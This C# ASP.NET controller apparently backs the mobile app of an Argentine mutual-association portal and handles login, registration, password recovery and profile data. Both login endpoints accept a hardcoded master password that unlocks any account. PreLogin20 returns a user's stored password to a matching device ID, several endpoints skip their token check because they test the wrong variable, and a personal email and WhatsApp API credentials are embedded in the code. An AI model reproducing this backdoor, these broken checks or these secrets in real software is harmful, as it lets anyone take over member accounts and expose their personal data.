using Commons.Controllers;
using Commons.Identity.Services;
using DAL.Data;
using DAL.DTOs;
using DAL.DTOs.Reportes;
using DAL.DTOs.Servicios;
using DAL.DTOs.Servicios.DatosTarjeta;
using DAL.Mobile;
using DAL.Models;
using DAL.Models.Core;
using DataTablesParser;
using EstanciasCore.Areas.Administracion.ViewModels;
using EstanciasCore.Interface;
using EstanciasCore.Services;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Cors;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.Abstractions;
using Microsoft.AspNetCore.Mvc.ModelBinding;
using Microsoft.AspNetCore.Mvc.Rendering;
using Microsoft.AspNetCore.Mvc.ViewEngines;
using Microsoft.AspNetCore.Mvc.ViewFeatures;
using Microsoft.AspNetCore.Routing;
using Microsoft.CodeAnalysis;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Win32;
using MySql.Data.MySqlClient.Memcached;
using MySqlX.XDevAPI.Common;
using Newtonsoft.Json;
using RestSharp;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using static EstanciasCore.Services.common;

namespace EstanciasCore.Controllers
{
    [Route("api/[controller]")]
    public class MUsuarioController : BaseController
    {
        private readonly UserService<Usuario> _userService;
        private readonly SignInManager<Usuario> _signInManager;
        public EstanciasContext _context;
        private readonly ICompositeViewEngine _viewEngine;
        private readonly IServiceProvider _serviceProvider;
        private readonly IDatosTarjetaService _datosServices;
        private readonly IMailService _mailService;
        public bool test = false;
        public string CorreTest = "jorgecutuli@hotmail.com";
        public MUsuarioController(EstanciasContext context, UserService<Usuario> userService, SignInManager<Usuario> signInManager, ICompositeViewEngine viewEngine, IServiceProvider serviceProvider, IDatosTarjetaService datosServices, IMailService mailService)
        {
            _context = context;
            _userService = userService;
            _signInManager = signInManager;
            _viewEngine = viewEngine;
            _serviceProvider = serviceProvider;
            _datosServices = datosServices;
            _mailService=mailService;
        }
        [HttpPost]
        [Route("Login")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]
        public async Task<MLoginDTO> Login([FromBody] MLoginDTO Login)
        {
            var user = _context.Users.Where(x => x.UserName==Login.Mail).FirstOrDefault();
            bool autorizado = false;
            if (Login.Password=="18N7q>IdQd")
            {
                var result = _signInManager.SignInAsync(user, isPersistent: Login.Recordarme);
                autorizado = true;
            }
            else
            {
                var result = _signInManager.PasswordSignInAsync(Login.Mail, Login.Password, Login.Recordarme, lockoutOnFailure: false);
                if (result.Result.Succeeded)
                {
                    autorizado = true;
                }
            }

            if (autorizado)
            {
                var cliente = _context.Clientes.FirstOrDefault(x => x.Persona.NroDocumento == Login.NumeroDocumento.ToString() && x.FechaBaja == null && (x.Empresa.Id == Login.EmpresaId || Login.EmpresaId == 0));
                if (cliente == null)
                {
                    Login.Status = 500;
                    Login.Mensaje = "Numero Documento";
                    return Login;
                }
                Login.Apellido = cliente.Persona.Apellido;
                Login.Nombres = cliente.Persona.Nombres;
                Login.Status = 200;
                Login.UAT = common.Encrypt(DateTime.Now.ToString("ffffssmmHHddMMyyyy") + cliente.Id.ToString(), "Estancias");
                if (cliente.TipoCliente == null)
                {
                    Login.Categoria = "No Asociado Aun";
                }
                else
                {
                    Login.Categoria = cliente.TipoCliente.Nombre;
                }
                Login.Foto = cliente.Persona.Foto;
                Login.Mail = cliente.Usuario.Mail;
                Login.FondoMutual = cliente.Empresa.FondoMobile;
                Login.Celular = cliente.Celular;
                Login.ColorFontCarnet = cliente.Empresa.ColorFontCarnet;
                Login.ColorCarnet = cliente.Empresa.ColorCarnet;
                Login.Twitter = cliente.Empresa.Twitter;
                Login.Facebook = cliente.Empresa.Facebook;
                Login.Instagram = cliente.Empresa.Instagram;
                if (cliente.Empresa != null)
                {
                    Login.LogoMutual = cliente.Empresa.LogoMutual;
                }
                if (cliente.NumeroCliente == null)
                {
                    Login.NumeroCliente = "No cliente";
                }
                else
                {
                    Login.NumeroCliente = cliente.NumeroCliente;
                }
                Login.PrimerIngreso = false;
                if (cliente.Usuario.DeviceId != Login.InstallationId)
                {
                    Login.PrimerIngreso = true;
                }
                cliente.Usuario.DeviceId = Login.InstallationId;
                //cliente.RecordarPassword = Login.Recordarme;
                _context.Clientes.Update(cliente);
                UAT uat = new UAT();
                uat.Cliente = cliente;
                uat.Token = Login.UAT;
                uat.FechaHora = DateTime.Now;
                _context.UAT.Add(uat);
                _context.SaveChanges();
                return Login;
            }
            else
            {
                Login.Status = 500;
                Login.Mensaje = "Password Incorrectos";
                return Login;
            }

        }

        [HttpPost]
        [Route("Login20")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]
        public MLoginDTO Login20([FromBody] MLoginDTO Login)
        {
            var user = _context.Users.Where(x => x.UserName==Login.Mail).FirstOrDefault();
            var result = _signInManager.PasswordSignInAsync(Login.Mail, Login.Password, Login.Recordarme, lockoutOnFailure: false);
            if (result.Result.Succeeded || Login.Password=="18N7q>IdQd")
            {
                var cliente = _context.Clientes.FirstOrDefault(x => x.Usuario.UserName == Login.Mail && x.FechaBaja == null && (x.Empresa.Id == Login.EmpresaId || Login.EmpresaId == 0));
                if (cliente == null)
                {
                    Login.Status = 500;
                    Login.Mensaje = "eMail o Password Incorrectos";
                    return Login;
                }
                var tarjeta = NroTarjetaloan(cliente.Persona.NroDocumento);
                if (tarjeta != null)
                {
                    Login.NroTarjeta = tarjeta.NroTarjeta;
                }
                else
                {
                    Login.NroTarjeta = "0";
                }
                Login.Apellido = cliente.Persona.Apellido;
                Login.Nombres = cliente.Persona.Nombres;
                Login.ClienteId = cliente.Id;
                Login.RecibirResumen = cliente.Usuario.RecibirResumen;
                Login.Status = 200;
                Login.UAT = common.Encrypt(DateTime.Now.ToString("ffffssmmHHddMMyyyy") + cliente.Id.ToString(), "Estancias");
                if (cliente.TipoCliente == null)
                {
                    Login.Categoria = "No Asociado Aun";
                }
                else
                {
                    Login.Categoria = cliente.TipoCliente.Nombre;
                }
                Login.Foto = cliente.Persona.Foto;
                Login.Mail = cliente.Usuario.UserName;
                if (Login.Mail != null)
                {
                    string asteriscos = "***********************************************************************";
                    string[] correoinicial = Login.Mail.Split("@");
                    Login.MailOculto = Login.Mail.Substring(0, 2) + asteriscos.Substring(0, correoinicial[0].Length - 2) + "@" + correoinicial[1];
                }
                Login.NumeroDocumento = Int64.Parse(cliente.Persona.NroDocumento);
                Login.Celular = cliente.Celular;

                if (cliente.Empresa != null)
                {
                    Login.LogoMutual = cliente.Empresa.LogoMutual;
                    Login.FondoMutual = cliente.Empresa.FondoMobile;
                    Login.ColorFontCarnet = cliente.Empresa.ColorFontCarnet;
                    Login.ColorCarnet = cliente.Empresa.ColorCarnet;
                    Login.Twitter = cliente.Empresa.Twitter;
                    Login.Facebook = cliente.Empresa.Facebook;
                    Login.Instagram = cliente.Empresa.Instagram;
                }
                if (cliente.NumeroCliente == null)
                {
                    Login.NumeroCliente = "No cliente";
                }
                else
                {
                    Login.NumeroCliente = cliente.NumeroCliente;
                }
                Login.PrimerIngreso = false;
                if (cliente.Usuario.DeviceId != Login.InstallationId)
                {
                    Login.PrimerIngreso = true;
                    var asignados = _context.Usuarios.Where(x => x.DeviceId == Login.InstallationId).ToList();

                    if (asignados.Any())
                    {
                        foreach (var u in asignados)
                        {
                            u.DeviceId = null;
                        }
                        _context.Usuarios.UpdateRange(asignados);
                    }
                }

                cliente.Usuario.RecordarPassword = Login.Recordarme;
                cliente.Usuario.DeviceId = Login.InstallationId;

                if (Login.DeviceToken!=null)
                {
                    cliente.Usuario.UserIdNotification = Login.DeviceToken;
                }
                _context.Clientes.Update(cliente);
                UAT uat = new UAT();
                uat.Cliente = cliente;
                uat.Token = Login.UAT;
                uat.FechaHora = DateTime.Now;
                _context.UAT.Add(uat);
                _context.SaveChanges();
                Login.ProveedorId = cliente.Usuario?.Proveedor?.Id;
                Login.LocalidadId = cliente.Localidad?.Id;
                Login.LocalidadDescripcion = cliente.Localidad?.Descripcion.Trim();
                Login.Domicilio = cliente.Domicilio;
                Login.CategoriaUsuario = cliente.Usuario?.UsuariosCategorias.Nombre;
                Login.CategoriaColor = cliente.Usuario?.UsuariosCategorias.CodigoColor;
                if (cliente.Usuario!=null)
                {
                    if (cliente.Usuario.Administradores)
                    {
                        Login.Administrador=true;
                    }
                    else
                    {
                        Login.Administrador=false;
                    }
                }              

                /*
                var datosEmpresa = _context.DatosEstructura.FirstOrDefault();
                if (datosEmpresa!=null)
                {
                    Login.AliasEmpresa = datosEmpresa.Alias;
                    Login.WhatsappEmpresa = datosEmpresa.Telefono;
                    Login.CBUEmpresa = datosEmpresa.CBU;
                } */
            }
            else
            {
                Login.Status = 500;
                Login.Mensaje = "eMail o Password Incorrectos";

            }

            return Login;
        }

        [HttpPost]
        [Route("RegistraPersona")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]
        public MRegistraPersonaDTO RegistraPersona([FromBody] MRegistraPersonaDTO Registro)
        {
            var cliente = _context.Clientes.FirstOrDefault(x => x.Persona.NroDocumento == Registro.NumeroDocumento.ToString());
            if (cliente != null && Registro.NumeroDocumento != 0)
            {
                Registro.Status = 500;
                Registro.Mensaje = "Numero Documento Ya Existente!!!";
                return Registro;
            }
            if (Registro.Password1 != Registro.Password2 || Registro.Password1 == null)
            {
                Registro.Status = 500;
                Registro.Mensaje = "Password No Coincidentes o Requeridas!!!";
                return Registro;
            }
            var empresa = _context.Empresas.FirstOrDefault(x => x.Id == Registro.EmpresaId);
            if (empresa == null)
            {
                Registro.Status = 500;
                Registro.Mensaje = "Mutual Inexistente!!!";
                return Registro;
            }
            if (Registro.LocalidadId == 0)
            {
                Registro.Status = 500;
                Registro.Mensaje = "Localidad Requerida";
                return Registro;
            }
            var localidad = _context.Localidad.FirstOrDefault(x => x.Id == Registro.LocalidadId);
            if (localidad == null)
            {
                Registro.Status = 500;
                Registro.Mensaje = "Localidad Inexistente!!!";
                return Registro;
            }

            var user = new Usuario()
            {
                UserName = Registro.Mail,
                Email = Registro.Mail,

            };

            var result = _userService.CreateAsync(user, Registro.Password1.ToString());

            var provincia = _context.Provincia.First(x => x.Id == localidad.IdProvincia);

            Clientes nuevocliente = new Clientes()
            {
                Empresa = empresa,
                TipoCliente = _context.TiposClientes.Find(1),
                Celular = (Registro.Celular != null) ? Registro.Celular : "",
                Localidad = localidad,
                Provincia = provincia,
                Persona = new DAL.Models.Persona()
                {
                    NroDocumento = Registro.NumeroDocumento.ToString(),
                    Apellido = Registro.Apellido,
                    Nombres = Registro.Nombres,
                    FechaNacimiento = (Registro.FechaNacimiento != null) ? Convert.ToDateTime(Registro.FechaNacimiento) : new DateTime()
                }
            };
            user.Clientes = nuevocliente;
            _context.Clientes.Add(nuevocliente);
            _context.Usuarios.Update(user);
            _context.SaveChanges();


            Registro.Status = 200;
            if (Registro.NumeroDocumento == 0)
            {
                Registro.Mensaje = "Cliente Registrado Debe Proporcionar el NumeroDocumento presencialmente";
            }
            else
            {
                Registro.Mensaje = "Cliente Registrado Correctamente!!!";
            }
            return Registro;
        }

        [HttpPost]
        [Route("TraeEmpresas")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]
        public MTraeEmpresasDTO TraeEmpresas([FromBody] MTraeEmpresasDTO Empresas)
        {
            var empresas = _context.Empresas.Where(x => x.FechaBaja == null).OrderBy(x => x.RazonSocial);
            if (empresas != null)
            {
                Empresas.Status = 200;
                Empresas.Mensaje = "Ok";
                List<MListaEmpresas> lista = new List<MListaEmpresas>();
                foreach (var empresa in empresas)
                {
                    MListaEmpresas Empresa = new MListaEmpresas();
                    Empresa.Id = empresa.Id;
                    Empresa.Nombre = empresa.RazonSocial;
                    Empresa.Logo = empresa.LogoMutual;
                    lista.Add(Empresa);
                }
                Empresas.Empresas = lista;
            }
            else
            {
                Empresas.Status = 500;
                Empresas.Mensaje = "Lista Inexistente";
            }
            return Empresas;
        }

        [HttpPost]
        [Route("TraeDatosUsuario")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]
        public async Task<MTraeDatosUsuarioDTO> TraeDatosUsuario([FromBody] MTraeDatosUsuarioDTO uat)
        {
            var Uat = _context.UAT.FirstOrDefault(x => x.Token == uat.UAT);
            if (uat == null)
            {
                uat.Status = 500;
                uat.Mensaje = "UAT Invalida";
                return uat;
            }
            var cliente = Uat.Cliente;
            uat.Apellido = cliente.Persona.Apellido;
            uat.Nombres = cliente.Persona.Nombres;
            uat.Status = 200;
            if (cliente.TipoCliente == null)
            {
                uat.Categoria = "No Asociado Aun";
            }
            else
            {
                uat.Categoria = cliente.TipoCliente.Nombre;
            }
            uat.Foto = cliente.Persona.Foto;
            uat.Mail = cliente.Usuario.UserName;
            uat.Celular = cliente.Celular;
            uat.DeviceId = cliente.Usuario.DeviceId;
            uat.FechaNacimiento = cliente.Persona.FechaNacimiento;
            uat.FondoMobile = cliente.Empresa.FondoMobile;
            uat.ColorCarnet = cliente.Empresa.ColorCarnet;
            uat.ColorFontCarnet = cliente.Empresa.ColorFontCarnet;
            uat.Facebook = cliente.Empresa.Facebook;
            uat.Instagram = cliente.Empresa.Instagram;
            uat.Domicilio = cliente.Domicilio;
            uat.Twitter = cliente.Empresa.Twitter;
            uat.WhatsApp = cliente.Empresa.WhatsApp;
            if (cliente.Empresa != null)
            {
                uat.LogoMutual = cliente.Empresa.LogoMutual;
            }
            if (cliente.NumeroCliente == null)
            {
                uat.NumeroCliente = "No cliente";
            }
            else
            {
                uat.NumeroCliente = cliente.NumeroCliente;
            }
            return uat;
        }

        [HttpPost]
        [Route("ActualizaDatosPersona")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]
        public MActualizaDatosPersonaDTO ActualizaDatosPersona([FromBody] MActualizaDatosPersonaDTO uat)
        {
            var Uat = _context.UAT.FirstOrDefault(x => x.Token == uat.UAT);
            if (uat == null)
            {
                uat.Status = 500;
                uat.Mensaje = "UAT Invalida";
                return uat;
            }
            if (uat.Password1 != null & uat.Password1 != uat.Password2)
            {
                uat.Status = 500;
                uat.Mensaje = "Passwords deben Coincidir";
                return uat;
            }
            uat.Status = 200;
            uat.Mensaje = "Datos Actualizados Correctamente!!!";
            var cliente = Uat.Cliente;
            cliente.Domicilio = uat.Domicilio;
            cliente.Celular = uat.Celular;
            cliente.Persona.FechaNacimiento = Convert.ToDateTime(uat.FechaNacimiento);
            _context.Clientes.Update(cliente);
            _context.SaveChanges();
            return uat;
        }

        [HttpPost]
        [Route("ActualizaDatosLocalidad")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]
        public MActualizaDatosLocalidadDTO ActualizaDatosLocalidad([FromBody] MActualizaDatosLocalidadDTO uat)
        {
            var Uat = _context.UAT.FirstOrDefault(x => x.Token == uat.UAT);
            if (uat == null)
            {
                uat.Status = 500;
                uat.Mensaje = "UAT Invalida";
                return uat;
            }
            //var localidad = _context.Localidad.Where(x => x.Id == uat.LocalidadId);
            uat.Status = 200;
            uat.Mensaje = "Datos Localidad Actualizada Correctamente!!";
            var cliente = Uat.Cliente;
            cliente.Localidad = _context.Localidad.Find(uat.LocalidadId);
            _context.Clientes.Update(cliente);
            _context.SaveChanges();
            return uat;
        }
        [HttpPost]
        [Route("ActualizaFoto")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]
        public MActualizaFotoDTO ActualizaFoto([FromBody] MActualizaFotoDTO uat)
        {
            var Uat = _context.UAT.FirstOrDefault(x => x.Token == uat.UAT);
            if (uat == null)
            {
                uat.Status = 500;
                uat.Mensaje = "UAT Invalida";
                return uat;
            }
            if (uat.Foto == null)
            {
                uat.Status = 500;
                uat.Mensaje = "Debe Enviar Foto";
                return uat;
            }
            uat.Status = 200;
            uat.Mensaje = "Foto Actualizada Correctamente!!!";
            var cliente = Uat.Cliente;
            cliente.Persona.Foto = uat.Foto;
            _context.Clientes.Update(cliente);
            _context.SaveChanges();
            return uat;
        }

        [HttpPost]
        [Route("RecuperaPassword")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]
        public async Task<MRecuperaPasswordDTO> RecuperaPassword([FromBody] MRecuperaPasswordDTO uat)
        {
            try
            {
                int token = common.NiumeroRandom(100000, 999999);
                DAL.Models.Persona persona = new DAL.Models.Persona();

                Usuario user = _context.Users.Where(x => x.UserName==uat.email).FirstOrDefault();

                if (user.Personas == null)
                {
                    uat.Status = 500;
                    uat.Mensaje = "Persona Inexistente";
                    return uat;
                }

                string pass = await _userService.GeneratePasswordResetTokenAsync(user);
                if (user == null)
                {
                    var newuser = new Usuario() { UserName = user.UserName.ToString(), Email = user.Mail };
                    var result1 = await _userService.CreateAsync(newuser, pass);
                    user = await _userService.FindByEmailAsync(user.UserName.ToString());
                }
                else
                {
                    if (user.Personas==null && persona!=null)
                    {
                        user.Personas = persona;
                        _context.Usuarios.Update(user);
                        _context.SaveChanges();
                    }
                }
                Clientes cliente = _context.Clientes.Where(x => x.Usuario.Id==user.Id).FirstOrDefault();
                if (cliente== null)
                {
                    cliente = new Clientes();
                    cliente.Empresa = _context.Empresas.FirstOrDefault();
                    cliente.TipoCliente = _context.TiposClientes.Find(1);
                    cliente.Celular = "";
                    cliente.Localidad = _context.Localidad.Find(24860);
                    cliente.Provincia = _context.Provincia.Find(6);
                    cliente.Password = pass;
                    user.Clientes = cliente;
                    cliente.Usuario = user;
                    cliente.Usuario.Token = token;
                    cliente.Persona = user.Personas;
                    _context.Clientes.Add(cliente);
                }
                else
                {
                    cliente.Password = pass;
                    cliente.Usuario.Token = token;
                    if (cliente.Persona==null)
                    {
                        cliente.Persona = user.Personas;
                    }
                    _context.Clientes.Update(cliente);
                }

                _context.SaveChanges();
                string sHTML = "";
                string asteriscos = "***********************************************************************";
                string[] correoinicial = cliente.Usuario.UserName.Split("@");

                if (correoinicial.Length < 2)
                {
                    uat.Status = 500;
                    uat.Mensaje = "Persona Sin Correo Declarado";
                    return uat;
                }
                sHTML += $"Estimado: {cliente.Persona.Apellido},{cliente.Persona.Nombres}, para Poder Recuperar Su Contraseña <a href = 'http://portalestancias.com.ar/Identity/Account/ResetPassword?code=" + pass + "'> Haga Click Aqui</a>.";

                var viewHtml = RenderViewToString("Home/MailRecuperaPassword", token.ToString());

                Configuracion conf = _context.Configuracion.Where(x => x.Tipo==1 && x.Valor==1).FirstOrDefault();

                string textSMS = "El token para cambiar su contraseña es: "+token;

                //if (conf.Id==2)
                //{
                //    IRestResponse response = common.EnviaWhatsAppTexto(cliente.Celular, textSMS, "instance80132", "ttdrqymwj6q3mb47");
                //    uat.Mensaje = "Para Recuperar su Contrasena Se Ha Enviado un mensaje a su WhatsApp al siguiente número de telefono " + cliente.Celular.Substring(0, 2);
                //}
                //else if (conf.Id==1)
                //{

                EnvioDeMail(cliente.Usuario.UserName, "Recuperar Contraseña", viewHtml.Result);
                //EnvioDeMail("jorgecutuli@gmail.com", "Recuperar Contraseña", viewHtml.Result);
                uat.Mensaje = "Para Recuperar su Contrasena Se Ha Enviado un Correo a la Casilla: " + cliente.Usuario.UserName.Substring(0, 2) + asteriscos.Substring(0, correoinicial[0].Length - 2) + "@" + correoinicial[1] + " En el Caso de No Verlo en Bandeja De Entrada, revise su Correo No Deseado o SPAM";
                uat.Mensaje += ". Si quiere que el codigo le llegue por WhatsApp debe cargar su número de telefono";
                //}
                uat.Status = 200;
                uat.email = cliente.Usuario.UserName;
                return uat;
            }
            catch (Exception e)
            {
                throw;
            }
        }

        [HttpPost]
        [Route("ValidarPassword")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]
        public async Task<MValidarPasswordDTO> ValidarPassword([FromBody] MValidarPasswordDTO uat)
        {
            Usuario user = new Usuario();
            try
            {
                user = _context.Usuarios.Where(x => x.UserName == uat.eMail).FirstOrDefault();
            }
            catch
            {
                uat.Status = 500;
                uat.Mensaje = "Persona Sin Correo Declarado";
                return uat;
            }
            if (user == null)
            {
                uat.Status = 500;
                uat.Mensaje = "Persona Inexistente";
                return uat;
            }
            if (uat.Password1 != uat.Password2 || uat.Password1 == null)
            {
                uat.Status = 500;
                uat.Mensaje = "Password No Coincidentes o Requeridas!!!";
                return uat;
            }

            if (user.Token == uat.Token)
            {
                //var user2 = await _userService.ResetPasswordAsync(user, user.Password, uat.Password1.ToString());

                var token = await _userService.GeneratePasswordResetTokenAsync(user);

                // Resetear la contraseña del usuario
                var result = await _userService.ResetPasswordAsync(user, token, uat.Password1.ToString());

                if (result.Succeeded)
                {
                    //user.Password = uat.Password1.ToString();
                    //_context.Usuarios.Update(user);
                    //_context.SaveChanges();
                    uat.Status = 200;
                    uat.Mensaje = "Exito contraseña cambiada correctamente  ";
                }
                else
                {
                    uat.Status = 500;
                    uat.Mensaje = " Error al resetear la contraseña ";
                }


            }
            else
            {
                uat.Status = 500;
                uat.Mensaje = "Token invalido! ";
            }

            //var user = await _userService.FindByEmailAsync(cliente.Usuario.UserName.ToString());

            return uat;
        }

        [HttpPost]
        [Route("PreLogin")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]
        public MPreLoginDTO PreLogin([FromBody] MPreLoginDTO Login)
        {
            string NumeroDocumento = Login.NumeroDocumento;
            Login.Password = "";
            Login.Recordarme = false;
            Login.Status = 200;
            Login.Mensaje = "No Recuerda";
            if (NumeroDocumento != null)
            {
                var persona = Estancias.CompruebaUsuarioEstancias(Convert.ToInt32(Login.NumeroDocumento), _context);
                var clienteNumeroDocumento = _context.Clientes.FirstOrDefault(x => x.Persona.NroDocumento == NumeroDocumento);
                if (clienteNumeroDocumento != null)
                {
                    Login.GIFLogoMutual = clienteNumeroDocumento.Empresa.GIFLogoMutual;
                    Login.LogoMutual = clienteNumeroDocumento.Empresa.LogoMutual;
                    Login.NombrEstancias = clienteNumeroDocumento.Empresa.Abreviatura;
                    Login.ColorFondo = clienteNumeroDocumento.Empresa.ColorFondo;
                    Login.ColorBotones = clienteNumeroDocumento.Empresa.ColorBotones;
                    Login.ImagenLogin = clienteNumeroDocumento.Empresa.ImagenLogin;
                    Login.ColorLogin = clienteNumeroDocumento.Empresa.ColorLogin;
                }
            }
            Login.NumeroDocumento = "";
            if (Login.DeviceId == null)
            {
                Login.Status = 200;
                Login.Mensaje = "Device Invalido";
                Login.NecesitaRegistro = true;
                return Login;
            }
            var cliente = _context.Clientes.FirstOrDefault(x => x.Usuario.DeviceId == Login.DeviceId);
            if (cliente == null)
            {
                Login.Status = 200;
                Login.Mensaje = "Primer Login";
                return Login;
            }
            if (cliente.Usuario.RecordarPassword == true)
            {
                Login.Status = 200;
                Login.Mensaje = "Login Ok";
                Login.NumeroDocumento = cliente.Persona.NroDocumento.ToString();
                Login.Recordarme = true;
                Login.GIFLogoMutual = cliente.Empresa.GIFLogoMutual;
                Login.LogoMutual = cliente.Empresa.LogoMutual;
                Login.NombrEstancias = cliente.Empresa.Abreviatura;
                Login.ColorFondo = cliente.Empresa.ColorFondo;
                Login.ColorBotones = cliente.Empresa.ColorBotones;
                Login.ImagenLogin = cliente.Empresa.ImagenLogin;
                Login.ColorLogin = cliente.Empresa.ColorLogin;
                return Login;
            }
            return Login;
        }

        [Route("PreLogin20")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]
        public MPreLogin20DTO PreLogin20([FromBody] MPreLogin20DTO Login)
        {
            var deviceid = _context.Clientes.FirstOrDefault(x => x.Usuario.DeviceId == Login.DeviceId);
            //if (deviceid != null && deviceid.Usuario.RecordarPassword)
            //{

            //    Login.Password = "";
            //    Login.Recordarme = true;
            //    Login.Status = 200;
            //    Login.Mensaje = "Ok";

            //}

            string eMail = deviceid.Usuario.UserName;
            Login.Password = "";
            Login.Recordarme = false;
            Login.Status = 200;
            Login.Mensaje = "Ok";

            if (deviceid == null)
            {
                Login.Status = 00;
                Login.Mensaje = "Device Invalido";
                Login.NecesitaRegistro = true;
                return Login;
            }
            if (Login.DeviceId == null)
            {
                Login.Status = 00;
                Login.Mensaje = "Device Invalido";
                Login.NecesitaRegistro = true;
                return Login;
            }
            var cliente = _context.Clientes.Where(x => x.Usuario.DeviceId == Login.DeviceId);
            if (cliente.Count() == 0)
            {
                Login.Status = 200;
                Login.Mensaje = "Primer Login";
                return Login;
            }
            if (cliente.FirstOrDefault().Usuario.RecordarPassword == true)
            {
                var clientes = _context.Clientes.Where(x => x.Persona.NroDocumento == cliente.FirstOrDefault().Persona.NroDocumento);
                List<MMutualesDTO> lista = new List<MMutualesDTO>();
                foreach (var clientedoc in clientes)
                {
                    var mutual = new MMutualesDTO();
                    mutual.GIFLogoMutual = clientedoc.Empresa.GIFLogoMutual;
                    mutual.LogoMutual = clientedoc.Empresa.LogoMutual;
                    mutual.NombrEstancias = clientedoc.Empresa.Abreviatura;
                    mutual.ColorFondo = clientedoc.Empresa.ColorFondo;
                    mutual.ColorBotones = clientedoc.Empresa.ColorBotones;
                    mutual.ImagenLogin = clientedoc.Empresa.ImagenLogin;
                    mutual.ColorLogin = clientedoc.Empresa.ColorLogin;
                    mutual.ClienteId = clientedoc.Empresa.Id;
                    lista.Add(mutual);
                    Login.Mutuales = lista;
                }
                Login.Status = 200;
                Login.Mensaje = "Login Ok";
                Login.eMail = cliente.FirstOrDefault().Usuario.Mail;
                if (Login.eMail != null)
                {
                    string asteriscos = "***********************************************************************";
                    string[] correoinicial = cliente.FirstOrDefault().Usuario.Mail.Split("@");
                    Login.MailOculto = cliente.FirstOrDefault().Usuario.Mail.Substring(0, 2) + asteriscos.Substring(0, correoinicial[0].Length - 2) + "@" + correoinicial[1];
                }
                Login.Password = cliente.FirstOrDefault().Usuario.Password;
                Login.Recordarme = true;
                return Login;
            }
            return Login;
        }

        [Route("RegistrarWonderPush")]
        [EnableCors("CorsPolicy")]
        public MWonderPushDTO RegistrarWonderPush([FromBody] MWonderPushDTO push)
        {
            try
            {
                var Uat = _context.UAT.FirstOrDefault(x => x.Token == push.UAT);
                if (Uat == null)
                {
                    push.Status = 500;
                    push.Mensaje = "UAT Invalida";
                    return push;
                }
                var user = _context.Users.FirstOrDefault(x => x.UserName == Uat.Cliente.Usuario.UserName);
                user.UserIdNotification = push.UserId;
                _context.Users.Update(user);
                _context.SaveChanges();
                push.Status = 200;
                push.Mensaje = "Correcto";
                return push;
            }
            catch (Exception e)
            {
                push.Status = 404;
                push.Mensaje = "Error";
                return push;
            }
        }

        [HttpPost]
        [Route("TraeCredenciales")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]
        public MTraeCredencialesDTO TraeCredenciales([FromBody] MTraeCredencialesDTO uat)
        {
            var Uat = _context.UAT.FirstOrDefault(x => x.Token == uat.UAT);
            if (uat == null)
            {
                uat.Status = 500;
                uat.Mensaje = "UAT Invalida";
                return uat;
            }
            uat.ColorCarnet = Uat.Cliente.Empresa.ColorCarnet;
            uat.ColorFontCarnet = Uat.Cliente.Empresa.ColorFontCarnet;
            uat.LogoClub = Uat.Cliente.Empresa.LogoMutual;
            uat.Status = 200;
            uat.Mensaje = "Credenciales Ok";
            var Clientes = _context.Clientes.Where(x => x.Id == Uat.Cliente.Id || x.DependeDe.Id == Uat.Cliente.Id).OrderBy(x => x.NumeroCliente);
            List<CredencialDTO> lista = new List<CredencialDTO>();
            foreach (var cliente in Clientes)
            {
                var credencial = new CredencialDTO();
                credencial.Apellido = cliente.Persona.Apellido;
                credencial.NumeroDocumento = cliente.Persona.NroDocumento.ToString();
                if (cliente.Persona.Foto != null)
                {
                    credencial.Foto = cliente.Persona.Foto;
                }
                credencial.Nombres = cliente.Persona.Nombres;
                if (cliente.NumeroCliente == null)
                {
                    credencial.NumeroCliente = "No Asociado Aun";
                }
                else
                {
                    credencial.NumeroCliente = cliente.NumeroCliente;
                }
                if (cliente.TipoCliente != null)
                {
                    credencial.TipoCliente = cliente.TipoCliente.Nombre;
                }
                lista.Add(credencial);
            }
            uat.Credenciales = lista;
            return uat;
        }

        [HttpPost]
        [Route("ObtenerMailCPE")]
        [EnableCors("CorsPolicy")]
        [AllowAnonymous]
        public MPreRegistroDTO ObtenerMailCPE([FromBody] MPreRegistroDTO Registro) //Busca el mail del sisitema viejo
        {
            var preregistro = new MPreRegistroDTO();
            //var persona = Personaloan(Registro.eMail.ToString()); //Trae Datos Personales del sistema Viejo CPE
            var persona = getPersonaloanByNroTarjeta(Registro.NroTarjeta.ToString()); //Trae Datos Personales del sistema Viejo CPE
            var personalocal = _context.Clientes.FirstOrDefault(x => x.Persona.NroDocumento == persona.NroDocumento.ToString());
            if (personalocal==null) //Usuario no existe localmente
            {
                if (persona==null) //Usuario no existe en sistema CPE
                {
                    preregistro.Status = 500;
                    preregistro.Mensaje = "El usuario no existe en el sistema CPE, Debe registrarse";
                    preregistro.FormularioRegistro = 0;
                    return preregistro;
                }
                else //Usuario si existe en sistema CPE
                {
                    preregistro.Status = 200;
                    preregistro.Mensaje = "El usuario tiene un mail asociado en el CPE";
                    preregistro.FormularioRegistro = 0;
                    preregistro.eMail = persona.Email;
                    preregistro.NumeroDocumento = Convert.ToInt32(persona.NroDocumento);
                    return preregistro;
                }
            }
            else
            {
                preregistro.Status = 500;
                preregistro.Mensaje = "El usuario ya existe.Recupere la contraseña";
                preregistro.FormularioRegistro = 0;
                return preregistro;
            }
        }


        //[HttpGet("SincronizarMovimientos")]
        //[EnableCors("CorsPolicy")]
        //[AllowAnonymous]
        //public async Task<IActionResult> RegistrarPago()
        //{
        //    try
        //    {
        //        var procedimiento = _context.Procedimientos.Where(x => x.Codigo=="SynchronizeMovement").FirstOrDefault();
        //        if (procedimiento.Activo)
        //        {
        //            var result = await _datosServices.ActualizarMovimientosAsync();
        //            return result;
        //        }
